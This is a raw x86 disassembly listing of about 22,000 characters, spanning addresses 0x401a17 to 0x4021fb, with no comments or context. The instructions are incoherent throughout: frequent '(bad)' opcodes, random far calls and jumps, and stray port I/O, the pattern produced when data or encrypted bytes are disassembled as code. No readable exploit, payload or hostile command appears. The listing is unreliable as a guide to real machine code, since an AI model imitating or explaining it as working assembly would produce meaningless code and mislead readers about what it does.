  401a17:	(bad)  
  401a18:	push   esi
  401a19:	(bad)  
  401a1a:	jno    0x4019a6
  401a1c:	push   esp
  401a1d:	jge    0x4019ad
  401a1f:	lock mov DWORD PTR [eax+0x2821fa0d],0x16c9990
  401a2a:	dec    ecx
  401a2b:	in     eax,dx
  401a2c:	xchg   edi,eax
  401a2d:	addr16 inc esi
  401a2f:	cwde   
  401a30:	shl    BYTE PTR [edi+0xf],0x68
  401a34:	mov    BYTE PTR [ebx-0x618269da],bh
  401a3a:	rol    BYTE PTR [edx-0x5e],1
  401a3d:	sub    BYTE PTR [ebx],dl
  401a3f:	inc    esi
  401a40:	pmulhuw mm3,mm4
  401a43:	xor    ebx,ecx
  401a45:	int    0xd
  401a47:	ss pushf 
  401a49:	jl     0x401ab8
  401a4b:	pop    edx
  401a4c:	mov    al,0x4f
  401a4e:	das    
  401a4f:	cmp    DWORD PTR [edi],eax
  401a51:	jmp    0x79d9ba44
  401a56:	and    DWORD PTR [edx+0x2115cbb9],esi
  401a5c:	push   es
  401a5d:	cmp    cl,BYTE PTR [eax-0x49]
  401a60:	xor    eax,0x6f966998
  401a65:	ret    0x654f
  401a68:	mov    DWORD PTR [ebp+ecx*4-0x25],ecx
  401a6c:	fiadd  WORD PTR ds:0x61987c5
  401a72:	(bad)  
  401a73:	pop    ecx
  401a74:	out    dx,al
  401a75:	cs and eax,0xb9c28d7
  401a7b:	jle    0x401ab0
  401a7d:	icebp  
  401a7e:	add    esi,edi
  401a80:	mov    ecx,0x5f93d29f
  401a85:	sbb    ah,BYTE PTR [ebp+eiz*2+0x36]
  401a89:	ja     0x401a1b
  401a8b:	mov    ds:0xd461c9f,al
  401a90:	out    0x46,eax
  401a92:	push   edx
  401a93:	call   FWORD PTR [edx]
  401a95:	jno    0x401a7d
  401a97:	or     bh,BYTE PTR [ebp+0x38]
  401a9a:	ret    
  401a9b:	adc    ecx,DWORD PTR [esp+ebp*4+0x10]
  401a9f:	idiv   DWORD PTR [edx+0x10e0e733]
  401aa5:	and    eax,DWORD PTR [eax-0x31]
  401aa8:	enter  0xc5b1,0xfc
  401aac:	(bad)  
  401aad:	jp     0x401a7b
  401aaf:	mov    ebp,0x109335f6
  401ab4:	outs   dx,BYTE PTR ds:[esi]
  401ab5:	sub    eax,0x164c1539
  401aba:	lods   al,BYTE PTR ds:[esi]
  401abb:	cmp    BYTE PTR [edi+0x20],al
  401abe:	adc    al,0x8a
  401ac0:	imul   BYTE PTR [edi+0x7c]
  401ac3:	xor    dl,al
  401ac5:	aad    0x2a
  401ac7:	fsub   DWORD PTR [ebp+0x214ed755]
  401acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ace:	fist   WORD PTR [eax+ebp*1]
  401ad1:	ror    BYTE PTR [edi],1
  401ad3:	xchg   ebx,eax
  401ad4:	mov    ds:0xcf04d8cd,eax
  401ad9:	add    al,0xba
  401adb:	outs   dx,BYTE PTR ds:[esi]
  401adc:	cmp    eax,0xf57f79ff
  401ae1:	xchg   esp,edi
  401ae3:	xchg   ebx,eax
  401ae4:	sub    edx,DWORD PTR [edx+0x7]
  401ae7:	pop    eax
  401ae8:	adc    al,0xf
  401aea:	imul   esi,DWORD PTR [ecx+0x22334144],0x4e
  401af1:	daa    
  401af2:	rol    BYTE PTR [edi+0xac070a0],0xb0
  401af9:	pop    edx
  401afa:	call   0x9567:0x96cb95dc
  401b01:	inc    eax
  401b02:	retf   
  401b03:	das    
  401b04:	push   cs
  401b05:	sbb    DWORD PTR [ebp+0x7cf7de89],esi
  401b0b:	add    ebx,0xaf516a8b
  401b11:	adc    edi,DWORD PTR [ecx+ebp*2+0x55]
  401b15:	push   0x62
  401b17:	mov    edx,0xcc7ebb92
  401b1c:	stos   DWORD PTR es:[edi],eax
  401b1d:	(bad)  
  401b1f:	pop    edi
  401b20:	xor    ebx,DWORD PTR [ecx+0x6e]
  401b23:	std    
  401b24:	push   eax
  401b25:	cld    
  401b26:	dec    edx
  401b27:	sar    bh,0x4d
  401b2a:	scas   al,BYTE PTR es:[edi]
  401b2b:	adc    DWORD PTR [ebx],0xffffffd5
  401b2e:	add    al,0xa9
  401b30:	add    bl,dh
  401b32:	fsubr  DWORD PTR [eax-0x73]
  401b35:	pop    esi
  401b36:	mov    eax,ds:0x968c14ec
  401b3b:	adc    eax,0x53c016db
  401b40:	mov    bl,ch
  401b42:	ins    BYTE PTR es:[edi],dx
  401b43:	push   ecx
  401b44:	popa   
  401b45:	fisttp WORD PTR [ebx+0x9]
  401b48:	and    esi,esi
  401b4a:	inc    esp
  401b4b:	fs jnp 0x401b87
  401b4e:	cli    
  401b4f:	xchg   edi,eax
  401b50:	jmp    0x401b74
  401b52:	mov    BYTE PTR [ecx],ah
  401b54:	fisub  DWORD PTR [ecx+0x2a]
  401b57:	and    al,0x4e
  401b59:	push   es
  401b5a:	fsub   st(1),st
  401b5c:	aad    0x96
  401b5e:	enter  0x59aa,0xaf
  401b62:	test   al,0xd0
  401b64:	mov    dh,0xe4
  401b66:	sbb    BYTE PTR [ebx+ebp*2],dl
  401b69:	das    
  401b6a:	(bad)  
  401b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b6c:	and    al,0x56
  401b6e:	add    DWORD PTR [esi],eax
  401b70:	not    bl
  401b72:	pop    esi
  401b73:	das    
  401b74:	loope  0x401b67
  401b76:	call   0x2bf:0x516396d7
  401b7d:	xchg   DWORD PTR [eax+0x75a563da],esi
  401b83:	xor    al,0x60
  401b85:	mov    eax,0x79859c73
  401b8a:	pop    eax
  401b8b:	in     eax,0x2c
  401b8d:	push   ecx
  401b8e:	stos   BYTE PTR es:[edi],al
  401b8f:	mov    esi,0x40115c50
  401b94:	std    
  401b95:	sti    
  401b96:	cmc    
  401b97:	mov    edi,0xa3996ec9
  401b9c:	xchg   esp,eax
  401b9d:	pop    esi
  401b9e:	enter  0x8fc0,0x1
  401ba2:	sub    al,al
  401ba4:	retf   
  401ba5:	fsub   QWORD PTR [esi+0x1b900b73]
  401bac:	adc    ah,BYTE PTR [esi]
  401bae:	dec    edi
  401baf:	push   cs
  401bb0:	inc    ecx
  401bb1:	push   edx
  401bb2:	sub    bl,ch
  401bb4:	add    eax,0x90dd124b
  401bb9:	mov    ebx,0x10207af9
  401bbe:	mov    ecx,0x80580e34
  401bc3:	or     eax,0x5d58019f
  401bc8:	ds js  0x401b85
  401bcb:	sbb    DWORD PTR [esi+0x6f],edi
  401bce:	dec    ecx
  401bcf:	call   FWORD PTR [edx]
  401bd1:	aam    0xb9
  401bd3:	mov    edi,0x818c1dc
  401bd8:	inc    ebx
  401bd9:	mov    al,cl
  401bdb:	adc    BYTE PTR [edx],bl
  401bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bde:	(bad)  
  401bdf:	imul   al
  401be1:	xchg   esi,eax
  401be2:	pusha  
  401be3:	mov    dh,0xed
  401be5:	inc    ebx
  401be6:	sbb    eax,0xd31080d6
  401beb:	mov    al,0x33
  401bed:	inc    eax
  401bee:	loope  0x401bd2
  401bf0:	push   esi
  401bf1:	popa   
  401bf2:	test   al,0xd5
  401bf4:	sbb    ecx,esi
  401bf6:	fdivr  QWORD PTR [esi]
  401bf8:	sbb    eax,0x4751d78f
  401bfd:	retf   
  401bfe:	cmp    bl,BYTE PTR ds:0x986a47fe
  401c04:	fist   DWORD PTR [ebx]
  401c06:	lahf   
  401c07:	outs   dx,BYTE PTR ds:[esi]
  401c08:	mov    eax,ds:0x7a9e50dc
  401c0d:	popf   
  401c0e:	sub    al,0xe1
  401c10:	pop    ecx
  401c11:	xchg   DWORD PTR [ebx],ebx
  401c13:	shr    BYTE PTR [edi],0x8b
  401c16:	enter  0x421e,0xba
  401c1a:	repz xchg edx,eax
  401c1c:	cmp    ah,BYTE PTR [edi-0x6e902991]
  401c22:	xchg   DWORD PTR [ecx],eax
  401c24:	push   esi
  401c25:	imul   eax,DWORD PTR [edx+0x66162afb],0x9e1b6452
  401c2f:	ja     0x401c15
  401c31:	and    eax,0x13b16615
  401c36:	jns    0x401ca5
  401c38:	cmp    ecx,DWORD PTR [eax-0x53c62a5d]
  401c3e:	outs   dx,DWORD PTR ds:[esi]
  401c3f:	xchg   edx,eax
  401c40:	dec    edi
  401c41:	daa    
  401c42:	je     0x401be2
  401c44:	retf   
  401c45:	mov    edx,0x4bc4a2a7
  401c4a:	sbb    BYTE PTR [edx+0x7e1f5db3],dh
  401c50:	jmp    0xad9ee4e1
  401c55:	and    al,BYTE PTR [esi]
  401c57:	pop    ss
  401c58:	cdq    
  401c59:	or     al,0x4d
  401c5b:	pusha  
  401c5c:	xrelease mov BYTE PTR fs:[ebp+0x14],ah
  401c61:	cli    
  401c62:	clc    
  401c63:	pusha  
  401c64:	retf   0xea9f
  401c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c68:	cmp    dh,dh
  401c6a:	mov    eax,0x53c6bf8d
  401c6f:	in     eax,dx
  401c70:	pop    edx
  401c71:	xchg   ebp,eax
  401c72:	lahf   
  401c73:	cmp    al,0xc8
  401c75:	mov    dh,0x70
  401c77:	js     0x401cad
  401c79:	inc    esp
  401c7a:	int    0x58
  401c7c:	repz fisubr WORD PTR [edi+0x56]
  401c80:	or     ah,BYTE PTR [ecx+0xccb966]
  401c86:	adc    BYTE PTR [edi-0x46],dh
  401c89:	mov    BYTE PTR [edx-0x33d5294c],al
  401c8f:	in     eax,dx
  401c90:	mov    eax,0x602394a
  401c95:	je     0x401cfa
  401c97:	daa    
  401c98:	fiadd  WORD PTR [ecx]
  401c9a:	pop    es
  401c9b:	cmp    al,0x50
  401c9d:	push   esp
  401c9e:	test   DWORD PTR [edx-0x44],esi
  401ca1:	mov    bh,0x2f
  401ca3:	cdq    
  401ca4:	mov    ebp,0xf34abe92
  401ca9:	out    0xd6,eax
  401cab:	jne    0x401c8d
  401cad:	jmp    0x371aad1c
  401cb2:	and    ebx,eax
  401cb4:	sub    DWORD PTR [eax],esi
  401cb6:	sub    eax,edx
  401cb8:	mov    bl,0x55
  401cba:	ffreep st(1)
  401cbc:	add    eax,0x76c36a83
  401cc1:	rcr    BYTE PTR [ebp-0x7bdb7a30],0x18
  401cc8:	(bad)  
  401cc9:	fnstcw WORD PTR [eax]
  401ccb:	dec    ecx
  401ccc:	lock cmp DWORD PTR [esi-0x6],0x45
  401cd1:	(bad)  
  401cd2:	retf   
  401cd3:	mov    esp,0x8bc24922
  401cd8:	and    eax,0x2291e2bc
  401cdd:	(bad)  
  401cde:	fsubr  DWORD PTR [esi]
  401ce0:	in     eax,0xa8
  401ce2:	add    esi,DWORD PTR [edi]
  401ce4:	and    edx,0x30
  401ce7:	aaa    
  401ce8:	jmp    0x401ce1
  401cea:	push   ebx
  401ceb:	jo     0x401d5b
  401ced:	or     eax,0x828fc3d8
  401cf2:	pop    esp
  401cf3:	inc    eax
  401cf4:	fcom   QWORD PTR [ecx]
  401cf6:	push   ss
  401cf7:	ret    
  401cf8:	push   ebp
  401cf9:	bound  edx,QWORD PTR [esp+eax*8]
  401cfc:	and    eax,0xaed67a54
  401d01:	cmp    ecx,DWORD PTR [ecx]
  401d03:	cli    
  401d04:	std    
  401d05:	aad    0xd
  401d07:	fwait
  401d08:	mov    dh,0xd1
  401d0a:	ja     0x401d4e
  401d0c:	outs   dx,DWORD PTR ds:[esi]
  401d0d:	jl     0x401d8c
  401d0f:	xchg   ebp,eax
  401d10:	pop    esi
  401d11:	add    al,0xa1
  401d13:	xor    BYTE PTR [ebx],bl
  401d15:	out    dx,eax
  401d16:	jno    0x401ced
  401d18:	nop
  401d19:	push   eax
  401d1a:	(bad)  [eax]
  401d1c:	cmp    BYTE PTR [ebx-0x24e291cb],cl
  401d22:	retf   
  401d23:	outs   dx,DWORD PTR ds:[esi]
  401d24:	popf   
  401d25:	imul   ebx,DWORD PTR [ebx],0xffffff9f
  401d28:	xor    bh,dh
  401d2a:	mov    dh,0xbe
  401d2c:	(bad)  
  401d2d:	mov    cl,0xd1
  401d2f:	xchg   esp,eax
  401d30:	fisub  DWORD PTR [edx-0x2aaba59d]
  401d36:	sub    ah,BYTE PTR [eax-0x78]
  401d39:	pop    ebp
  401d3a:	repz fimul WORD PTR [esp+ebx*1-0x41d2ee6f]
  401d42:	mov    eax,0x5e5ae76
  401d47:	push   esi
  401d48:	pusha  
  401d49:	shl    BYTE PTR [esi+0x678440e3],0x93
  401d50:	cwde   
  401d51:	mov    ?,WORD PTR [edi+eiz*8]
  401d54:	gs cs sahf 
  401d57:	pop    edx
  401d58:	ret    0x7f40
  401d5b:	dec    esp
  401d5c:	repnz add ch,bh
  401d5f:	scas   ax,WORD PTR es:[edi]
  401d61:	add    eax,0x47bba61e
  401d66:	sub    esi,eax
  401d68:	fwait
  401d69:	ror    ebx,0x3c
  401d6c:	pop    esp
  401d6d:	jp     0x401d54
  401d6f:	inc    eax
  401d70:	inc    esp
  401d71:	or     eax,0x6300caac
  401d76:	sbb    cl,BYTE PTR [ecx+0x78]
  401d79:	les    esi,FWORD PTR [ebx-0x7f]
  401d7c:	lods   eax,DWORD PTR ds:[esi]
  401d7d:	dec    ebp
  401d7e:	or     DWORD PTR [edi-0x48],esi
  401d81:	xor    eax,0x650227c1
  401d86:	jnp    0x401d2a
  401d88:	in     al,0xdf
  401d8a:	mov    bl,0xeb
  401d8c:	das    
  401d8d:	icebp  
  401d8e:	js     0x401d9f
  401d90:	lock inc esi
  401d92:	lahf   
  401d93:	add    DWORD PTR fs:[edx-0x38],edi
  401d97:	xor    ch,BYTE PTR [esi+0x25]
  401d9a:	and    ebx,DWORD PTR [ebx+0x5863ac3d]
  401da0:	scas   eax,DWORD PTR es:[edi]
  401da1:	sub    BYTE PTR [esi],dh
  401da3:	xor    ebx,edi
  401da5:	mov    WORD PTR [edi+0x6e],fs
  401da8:	das    
  401da9:	xor    DWORD PTR [edi+edx*2-0x80],edx
  401dad:	retf   
  401dae:	into   
  401daf:	test   DWORD PTR [ebx-0x63b9a3ab],0x562959fe
  401db9:	leave  
  401dba:	cmp    DWORD PTR [ebx-0x57],ecx
  401dbd:	xchg   ebx,eax
  401dbe:	scas   al,BYTE PTR es:[edi]
  401dbf:	arpl   WORD PTR [ebp-0x41],si
  401dc2:	ror    BYTE PTR [ebp+ebp*2-0x6d],cl
  401dc6:	dec    edi
  401dc7:	aaa    
  401dc8:	jecxz  0x401dc8
  401dca:	sbb    DWORD PTR ds:[eax+0x5f],ecx
  401dce:	dec    ebx
  401dcf:	mov    cl,BYTE PTR [ecx]
  401dd1:	mov    ebx,0xf9ff1647
  401dd6:	ss stos DWORD PTR es:[edi],eax
  401dd8:	out    dx,eax
  401dd9:	pop    ecx
  401dda:	hlt    
  401ddb:	sbb    eax,0xaf11335b
  401de0:	enter  0xd022,0x94
  401de4:	sar    BYTE PTR [ecx-0x37],1
  401de7:	lds    ecx,FWORD PTR [esi+0x6b6e05bf]
  401ded:	cmc    
  401dee:	xor    DWORD PTR [eax-0x61],edi
  401df1:	mov    eax,0xc4ed51c9
  401df6:	pusha  
  401df7:	mov    ebp,0xd00dbcc0
  401dfc:	inc    ecx
  401dfd:	std    
  401dfe:	or     ebp,DWORD PTR [esi-0x1e3a782b]
  401e04:	rcl    al,1
  401e06:	cwde   
  401e07:	ss sub bl,bl
  401e0a:	fistp  QWORD PTR [eax-0x1f]
  401e0d:	dec    ecx
  401e0e:	imul   edi,DWORD PTR [edx],0x71
  401e11:	mov    ebx,0xc687558d
  401e16:	fcom   QWORD PTR [ebx]
  401e18:	and    edx,ebx
  401e1a:	test   DWORD PTR [ebx+0x6],esp
  401e1d:	js     0x401e62
  401e1f:	jae    0x401e17
  401e21:	or     BYTE PTR [ebp-0x6d],dl
  401e24:	jno    0x401e35
  401e26:	cdq    
  401e27:	leave  
  401e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e29:	mov    al,ds:0x6c3b80d7
  401e2e:	push   ss
  401e2f:	popf   
  401e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e31:	sbb    al,0xd4
  401e33:	(bad)  
  401e34:	iret   
  401e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e36:	lods   eax,DWORD PTR ds:[esi]
  401e37:	jno    0x401e61
  401e39:	jg     0x401ddf
  401e3b:	dec    ebx
  401e3c:	shr    BYTE PTR [ecx],0x4f
  401e3f:	scas   eax,DWORD PTR es:[edi]
  401e40:	sbb    DWORD PTR [edx+ebp*2-0x1e3ba7c1],0x65828d96
  401e4b:	and    BYTE PTR [edi-0x69],dh
  401e4e:	sbb    ecx,DWORD PTR [ecx+0x4b]
  401e51:	les    eax,FWORD PTR [eax+0x75]
  401e54:	hlt    
  401e55:	xchg   esp,eax
  401e56:	mov    WORD PTR [ebx-0x14],es
  401e59:	shr    cl,0xdb
  401e5c:	add    ebx,esp
  401e5e:	pavgb  mm6,QWORD PTR [edi-0x50]
  401e62:	inc    esp
  401e63:	add    eax,0xa2ef2b96
  401e68:	test   eax,0x36248877
  401e6d:	jge    0x401dfb
  401e6f:	push   ecx
  401e70:	(bad)  
  401e71:	and    ebp,DWORD PTR [edx+0x3117c7b4]
  401e77:	fld    DWORD PTR [edx+eax*8+0x38361032]
  401e7e:	cmc    
  401e7f:	sbb    dl,BYTE PTR [esp+esi*8+0x459591d2]
  401e86:	(bad)  
  401e87:	and    eax,0x8a9f5246
  401e8c:	dec    esp
  401e8d:	push   0x66
  401e8f:	xchg   edx,eax
  401e90:	dec    ebp
  401e91:	pop    esp
  401e92:	shr    BYTE PTR gs:[ebp+esi*8+0x19a51452],1
  401e9a:	jmp    0xc8a37f1c
  401e9f:	dec    esp
  401ea0:	add    DWORD PTR [edx+0x2e21ef43],ebp
  401ea6:	imul   esi,DWORD PTR [edx+0x12],0x33
  401eaa:	or     ah,BYTE PTR [eax]
  401eac:	xor    BYTE PTR [ebx+eiz*1-0x4a],cl
  401eb0:	jle    0x401f13
  401eb2:	ds sub eax,0x279a6466
  401eb8:	fadd   QWORD PTR [ecx]
  401eba:	jne    0x401eb0
  401ebc:	xlat   BYTE PTR ds:[ebx]
  401ebd:	es xchg esp,eax
  401ebf:	add    eax,0x330d45a1
  401ec4:	mov    al,ds:0x1b247ff2
  401ec9:	xor    dh,BYTE PTR [ebp-0x727912d3]
  401ecf:	(bad)  
  401ed1:	jo     0x401eb5
  401ed3:	or     edx,0xba43a9d7
  401ed9:	and    cl,0xb3
  401edc:	loopne 0x401eac
  401ede:	jo     0x401eaf
  401ee0:	test   BYTE PTR [edi+eiz*1],bl
  401ee3:	and    eax,0xecc4174
  401ee8:	out    dx,al
  401ee9:	or     ecx,DWORD PTR [edx+0x1]
  401eec:	fs dec esp
  401eee:	ret    
  401eef:	outs   dx,BYTE PTR ds:[esi]
  401ef0:	inc    ebx
  401ef1:	aad    0x22
  401ef3:	xor    BYTE PTR [edi],bh
  401ef5:	mov    al,0x9a
  401ef7:	or     eax,0xe7cd1e6e
  401efc:	mov    edi,0x93955efa
  401f01:	sti    
  401f02:	jb     0x401f64
  401f04:	outs   dx,DWORD PTR ds:[esi]
  401f05:	outs   dx,BYTE PTR ds:[esi]
  401f06:	sbb    edi,edi
  401f08:	pop    esp
  401f09:	gs call 0x790aa347
  401f0f:	pop    ds
  401f10:	enter  0xd103,0xf0
  401f14:	jg     0x401f70
  401f16:	retf   0xb9ec
  401f19:	(bad)  
  401f1a:	lods   al,BYTE PTR ds:[esi]
  401f1b:	stc    
  401f1c:	test   al,0xee
  401f1e:	mov    WORD PTR ds:0xd90d5703,cs
  401f24:	sub    DWORD PTR [ebp+0x72],0x3eccb9cc
  401f2b:	fistp  WORD PTR [esp+ebx*4+0x4b99e671]
  401f32:	inc    eax
  401f33:	push   ecx
  401f34:	lock adc BYTE PTR [edi-0x5f35a42e],ah
  401f3b:	mov    ecx,0x9598a96c
  401f40:	sub    eax,0x575eabf9
  401f45:	jbe    0x401eff
  401f47:	dec    eax
  401f48:	dec    edx
  401f49:	iret   
  401f4a:	inc    esi
  401f4b:	paddusw mm6,QWORD PTR [eax+0x1b]
  401f4f:	pop    cx
  401f51:	xlat   BYTE PTR ds:[ebx]
  401f52:	adc    bh,dl
  401f54:	add    eax,DWORD PTR [ebx-0xca44b0d]
  401f5a:	aam    0xc5
  401f5c:	sar    DWORD PTR [eax+0x6c48a80c],1
  401f62:	xor    DWORD PTR [ecx-0x16117957],0x50
  401f69:	cmp    eax,0x72914f72
  401f6e:	jns    0x401fd2
  401f70:	or     BYTE PTR ds:0x28763758,al
  401f76:	jnp    0x401fca
  401f78:	adc    al,BYTE PTR [esi-0x24bbd2fa]
  401f7e:	mov    ebx,0xd65950ca
  401f83:	jns    0x401fdd
  401f85:	popa   
  401f86:	cld    
  401f87:	pop    es
  401f88:	mov    edx,0xdd29d261
  401f8d:	mov    fs,WORD PTR [ebx-0x43496333]
  401f93:	mov    ecx,0xd99aac32
  401f98:	ja     0x401f9b
  401f9a:	cld    
  401f9b:	call   0x38bf:0x4a28e9f
  401fa2:	aas    
  401fa3:	mov    dl,0x3a
  401fa5:	mov    ds:0x3dc41692,eax
  401faa:	xlat   BYTE PTR ds:[ebx]
  401fab:	mov    ds:0x45338c51,eax
  401fb0:	icebp  
  401fb1:	push   esp
  401fb2:	repnz pop ebp
  401fb4:	call   0xb6b5:0x460e2cfe
  401fbb:	mov    DWORD PTR [edi],ecx
  401fbd:	add    edi,esp
  401fbf:	es inc ecx
  401fc1:	stc    
  401fc2:	cld    
  401fc3:	or     BYTE PTR [ecx],bl
  401fc5:	js     0x401ff1
  401fc7:	je     0x401fd4
  401fc9:	push   edx
  401fca:	call   0xe76e3efe
  401fcf:	xor    ebp,ebx
  401fd1:	test   al,0x7c
  401fd3:	clc    
  401fd4:	inc    esi
  401fd5:	dec    esp
  401fd6:	ret    0x61b8
  401fd9:	add    BYTE PTR [esi-0x21],bh
  401fdc:	push   edx
  401fdd:	push   ebx
  401fde:	lds    ebx,FWORD PTR [ebp+edx*4+0x3b]
  401fe2:	ret    0x4d5c
  401fe5:	or     DWORD PTR [ebx+0x7fc8b964],0x5d
  401fec:	adc    al,0x39
  401fee:	sub    DWORD PTR [eax],ebp
  401ff0:	shr    esp,1
  401ff2:	loope  0x40202d
  401ff4:	mov    dh,0xdc
  401ff6:	pusha  
  401ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff8:	lock pushf 
  401ffa:	out    0x1,al
  401ffc:	div    DWORD PTR [edi]
  401ffe:	cmp    eax,0x4eb3cdb2
  402003:	sbb    BYTE PTR [edi+0x72],cl
  402006:	addr16 popf 
  402008:	push   edi
  402009:	fs inc edi
  40200b:	inc    ebx
  40200c:	ds xchg esi,eax
  40200e:	cdq    
  40200f:	repnz and DWORD PTR [edx+0x6b],esp
  402013:	jmp    0xa90ab379
  402018:	mov    bh,0x6d
  40201a:	arpl   WORD PTR [edi+0x17f23f7a],dx
  402020:	pop    ecx
  402021:	jp     0x402033
  402023:	int3   
  402024:	ins    BYTE PTR es:[edi],dx
  402025:	cmp    bh,dl
  402027:	call   0x104195a5
  40202c:	imul   eax,DWORD PTR ds:0x56eefe67,0xffffffb6
  402033:	mov    dh,0x62
  402035:	jl     0x401fcd
  402037:	or     al,0x46
  402039:	cdq    
  40203a:	out    dx,eax
  40203b:	out    0x32,al
  40203d:	fcom   DWORD PTR [eax+0x1c10791e]
  402043:	test   eax,0xfde44782
  402048:	and    al,0x2a
  40204a:	xor    BYTE PTR ds:0x2a86a27d,cl
  402050:	add    al,0xc
  402052:	push   ds
  402053:	jb     0x401ffb
  402055:	clc    
  402056:	xchg   ebx,eax
  402057:	jo     0x4020b7
  402059:	loope  0x40203e
  40205b:	jmp    0x2540472b
  402060:	jge    0x402032
  402062:	jmp    0x40204c
  402064:	mov    eax,ds:0xc29b3be9
  402069:	inc    esp
  40206a:	add    edi,ebp
  40206c:	pop    ecx
  40206d:	(bad)  
  40206e:	push   esp
  40206f:	enter  0xc0e4,0xcc
  402073:	jae    0x402070
  402075:	sahf   
  402076:	(bad)  
  402077:	cmp    ch,BYTE PTR [ebx-0x11544bd7]
  40207d:	push   edi
  40207e:	sbb    edx,ebp
  402080:	jp     0x4020e0
  402082:	mov    cl,0xe2
  402084:	add    esp,DWORD PTR [ebx-0x10]
  402087:	jne    0x402034
  402089:	or     eax,0xf0975d10
  40208e:	and    BYTE PTR [ecx],ah
  402090:	xor    eax,0x278453d5
  402095:	jg     0x402083
  402097:	jmp    0x8fe63fed
  40209c:	cs scas eax,DWORD PTR es:[edi]
  40209e:	pop    ss
  40209f:	sbb    ch,al
  4020a1:	add    al,0xb7
  4020a3:	rcr    DWORD PTR [ecx+0x3b],0x22
  4020a7:	ror    edi,0xf1
  4020aa:	popa   
  4020ab:	mov    WORD PTR [edi+esi*2+0x68],ds
  4020af:	dec    ecx
  4020b0:	cli    
  4020b1:	je     0x4020f8
  4020b3:	pop    ds
  4020b4:	xor    DWORD PTR [esi+0x11103769],esp
  4020ba:	sar    BYTE PTR [eax],0x4e
  4020bd:	(bad)  
  4020bf:	add    al,0x94
  4020c1:	jmp    0x405c2579
  4020c6:	pop    eax
  4020c7:	stos   BYTE PTR es:[edi],al
  4020c8:	cs call 0xa2f3:0x14e7126d
  4020d0:	fcmovne st,st(5)
  4020d2:	pop    esp
  4020d3:	stc    
  4020d4:	cmc    
  4020d5:	xchg   esp,eax
  4020d6:	out    dx,al
  4020d7:	cmc    
  4020d8:	push   esi
  4020d9:	jae    0x402116
  4020db:	ss dec ebx
  4020dd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020df:	mov    edi,0xd19cd590
  4020e4:	dec    edi
  4020e5:	jo     0x4020e6
  4020e7:	iret   
  4020e8:	dec    edi
  4020e9:	data16 lock loop 0x40210d
  4020ed:	retf   0xb28d
  4020f0:	(bad)  
  4020f1:	movaps xmm0,XMMWORD PTR [eax+0x34]
  4020f5:	mov    cl,0x14
  4020f7:	xchg   ebp,eax
  4020f8:	add    eax,DWORD PTR [esi]
  4020fa:	sub    DWORD PTR [esi-0x1b],ecx
  4020fd:	stos   BYTE PTR es:[edi],al
  4020fe:	(bad)  
  4020ff:	lds    esi,FWORD PTR [edx+0x6a5a879]
  402105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402106:	mov    esp,0xfe25e4ba
  40210b:	ds sbb eax,0xee35569a
  402111:	or     DWORD PTR [ebp+0x32],esp
  402114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402115:	sar    DWORD PTR ds:0x7df6c929,1
  40211b:	cmp    DWORD PTR [edi],esi
  40211d:	inc    esp
  40211e:	mov    esp,0xbe02fd26
  402123:	not    eax
  402125:	push   ebp
  402126:	scas   al,BYTE PTR es:[edi]
  402127:	inc    edx
  402128:	jge    0x4021a2
  40212a:	popf   
  40212b:	fild   DWORD PTR ds:0x276c1b6f
  402131:	xor    eax,DWORD PTR [esi-0x4f]
  402134:	aad    0xc6
  402136:	arpl   WORD PTR [esi+0x10],di
  402139:	scas   eax,DWORD PTR es:[edi]
  40213a:	mov    WORD PTR [eax],ss
  40213c:	popa   
  40213d:	mov    esp,cs
  40213f:	xchg   ebx,eax
  402140:	(bad)  
  402141:	imul   bh
  402143:	fldz   
  402145:	and    DWORD PTR [ecx+ebp*4],ecx
  402148:	bound  ebx,QWORD PTR [esi-0x52]
  40214b:	aad    0x75
  40214d:	mov    ebp,0x78139363
  402152:	dec    esp
  402153:	cmp    edx,DWORD PTR [eax+0x7c3c6faf]
  402159:	ret    
  40215a:	mov    ebp,0x27e21f6f
  40215f:	sbb    eax,0x804f0fbf
  402164:	es loope 0x40217b
  402167:	loope  0x402164
  402169:	adc    eax,0xf9a6e672
  40216e:	jmp    0xf961:0xcac24c5
  402175:	mov    ebp,DWORD PTR ds:0x4b3bf9f6
  40217b:	mov    ebx,0xa602d645
  402180:	arpl   cx,sp
  402182:	adc    al,0x3e
  402184:	jl     0x4021de
  402186:	jbe    0x40212f
  402188:	retf   
  402189:	mov    ebp,DWORD PTR [ebp-0x49a8fa02]
  40218f:	neg    BYTE PTR [ebx+ebx*4+0x34]
  402193:	imul   DWORD PTR fs:[ebp+0x4]
  402197:	and    eax,0x55df464a
  40219c:	mov    bh,BYTE PTR ds:[edx]
  40219f:	or     BYTE PTR [ebx+0x27d1275c],bl
  4021a5:	sahf   
  4021a6:	and    DWORD PTR [ecx-0x6782a6e2],esp
  4021ac:	sbb    BYTE PTR [edx],al
  4021ae:	sub    ebx,DWORD PTR [edx+0x7b39f400]
  4021b4:	in     eax,dx
  4021b5:	mov    al,0xc
  4021b7:	retf   0x77a0
  4021ba:	sar    cl,cl
  4021bc:	jge    0x40222f
  4021be:	inc    ebp
  4021bf:	sub    DWORD PTR [edi+0x56],edx
  4021c2:	gs push edx
  4021c4:	jmp    FWORD PTR [eax]
  4021c6:	pop    es
  4021c7:	jne    0x402224
  4021c9:	mov    ebp,0x924ddc5f
  4021ce:	popa   
  4021cf:	pop    es
  4021d0:	adc    BYTE PTR [edx],bh
  4021d2:	dec    ecx
  4021d3:	sub    al,0xb6
  4021d5:	xchg   ebx,eax
  4021d6:	add    BYTE PTR [ebp+eiz*1-0x30],0xbd
  4021db:	jmp    0xacad3b8a
  4021e0:	sbb    cl,BYTE PTR [ebp+0x3d]
  4021e3:	jecxz  0x402248
  4021e5:	and    al,0x4f
  4021e7:	jecxz  0x4021e3
  4021e9:	fs xor al,0xbc
  4021ec:	or     al,0xbb
  4021ee:	imul   esi,DWORD PTR [ebp+0x5707a973],0xdf92704a
  4021f8:	xchg   edx,eax
  4021f9:	mov    bl,0x44
  4021fb:	cmc    
